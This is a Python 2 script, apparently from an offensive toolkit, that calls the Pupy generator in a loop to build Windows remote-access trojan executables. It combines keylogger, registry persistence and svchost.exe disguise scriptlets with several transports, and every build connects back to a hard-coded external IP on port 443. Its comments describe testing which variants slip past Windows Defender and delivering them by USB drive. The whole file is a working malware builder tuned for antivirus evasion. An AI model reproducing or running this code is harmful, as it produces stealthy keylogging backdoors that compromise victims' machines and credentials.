#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
import StringIO

# Make a tester of each payload
#
# Focus on scriptlets
#
# Of each scriptlet make eight encoded windows shells. Including no scriptlet
#
# See which ones get through.
#
# It was probably heusristics detection that caught it
#
# Make sure cloud is off
# Update Windows Defender
#
# Use tablet as handler controller
# Use usb drive for delivery
#
# The virus is getting caught at execution

# for each scriptlet combination


scriptlet_persistence = ' -s persistence,method=registry '
scriptlet_keylogger = ' -s keylogger '
scriptlet_hideargv = ' -s hide_argv,name=svchost.exe '
scriptlet_daemonize = ' -s daemonize '
scriptlet_none = ' '

scriptlet_Dict = {
    '1': scriptlet_persistence,
    '2': scriptlet_keylogger,
    '3': scriptlet_hideargv,
    '4': scriptlet_daemonize,
    '5': scriptlet_none
    }

scriptlet_str_Dict = {
    scriptlet_persistence: 'persistence',
    scriptlet_keylogger: 'keylogger',
    scriptlet_hideargv: 'hidearg',
    scriptlet_daemonize: 'daemon',
    scriptlet_none: 'noscriptlet'
}
# make nine different payloads (encryption)
transport_Dict = {
    '1': 'obfs3',
    '2': 'udp',
    '3': 'http',
    #$'4': 'tcp_cleartext',
    '5': 'rsa',
    '6': 'ssl',
    #'7': 'udp_cleartext',
    '8': 'scramblesuit',
    '9': 'ssl_rsa'
    }


Format_Chosen = 'client'
Operating_System = 'windows'
Architecture_Value = 'x86'
file_extension = 'exe'
host_Connectback = '52.53.180.45'
host_Port = '443'

# for key in scriptlet_Dict:
#     for key in transport_Dict:

# for key in transport_Dict:
#     for key in scriptlet_Dict:
#
# for key in transport_Dict:

for key in scriptlet_Dict:
    scriptlet = scriptlet_Dict[key]
    for key in transport_Dict:
        Transport_Chosen = transport_Dict[key]
        scriptlet_str = scriptlet_str_Dict[scriptlet]
        cmd_String = "python /root/pupy/pupy/pupygen.py -f {0}{1}-O {2} -A {3} -o /root/ArmsCommander/payloads/tester/{4}_{5}_{6}_{7}_{8}.{9} --randomize-hash connect --host {10}:{11} -t {12}".format(
            Format_Chosen, # 0
            scriptlet,#1
            Operating_System, # 2
            Architecture_Value, #3
            Format_Chosen, #4
            Operating_System, # 5
            Architecture_Value, # 6
            Transport_Chosen, # 7
            scriptlet_str,#8
            file_extension, # 9
            host_Connectback, # 10
            host_Port, # 11
            Transport_Chosen # 12

        )
        text = colored('[+] Now Generating Windows Payload %s %s','cyan', attrs=['bold']) % (scriptlet, Transport_Chosen)
        print text
        print colored(cmd_String,'red')
        os.system(cmd_String)
